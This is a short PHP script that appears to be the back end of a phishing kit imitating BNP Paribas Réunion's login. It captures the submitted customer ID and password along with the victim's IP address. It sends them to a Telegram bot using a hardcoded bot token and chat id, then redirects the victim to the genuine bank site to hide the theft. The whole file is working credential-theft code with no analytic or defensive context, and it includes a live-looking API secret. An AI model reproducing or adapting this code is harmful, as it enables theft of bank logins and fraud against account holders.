<?php
function functiondilih($cc)
{
	$key = "5115444876:AAFqEONS2C5HcQEBXQ7dBT8ulJfY-_L4NVk";// hat hna apikey
	$idchat ="1306340115";//hat hna id chat   
	
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot'.$key.'/sendMessage');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=".$idchat."&text=".$cc."");
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	
	$headers = array();
	$headers[] = 'Content-Type: application/x-www-form-urlencoded';
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	
	$result = curl_exec($ch);
	
	curl_close ($ch);
}
{
	
	$date = gmdate("H:i:s | d/m/Y");
	$victim_ip = getenv("REMOTE_ADDR");
	$message1 = "
	========[  InFo BNP REUNION  ]========
	Identifiant client   = ".$_POST["client_id"]."
	Mot de passe = ".$_POST["client_pass"]."
	========[  Ip VICTIM   ]========
	[IP INFO]      = https://geoiptool.com/en/?ip=".$victim_ip."
	[TIME/DATE]    = ".$date."
	========[  BY ELDOURO ]========
	";
	
	
	
	functiondilih($message1);
	
	
	
	header('Location: //www.bnpparibas.re/');
}

?>